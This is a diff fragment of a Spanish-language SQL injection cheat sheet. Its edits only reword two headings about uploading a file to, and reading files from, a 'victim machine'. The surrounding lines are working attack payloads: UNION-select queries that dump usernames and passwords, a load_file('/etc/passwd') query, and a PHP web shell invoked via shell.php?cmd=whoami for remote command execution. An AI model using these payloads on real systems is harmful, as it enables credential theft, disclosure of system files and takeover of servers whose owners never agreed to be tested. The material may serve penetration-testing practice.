@@ -143,7 +143,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select username||':'||password from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
 ```
 
-## Subir un archivo a una ruta especifica 
+## Subir un archivo a una ruta especifica en la maquina victima
 
 ```bash 
 # Subir un achivo que contiene codigo PHP malicioso en una ruta especifica para hacer ejecucion remota de comandos 'RCE' 
@@ -154,7 +154,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 	shell.php?cmd=whoami
 ```
 
-## Leer archivos de la maquina victima 
+## Leer (cargar) archivos de la maquina victima 
 
 ```bash 
 ❯ ' union select load_file("/etc/passwd")-- -                  # Leer el '/etc/passwd' de la maquina victima 
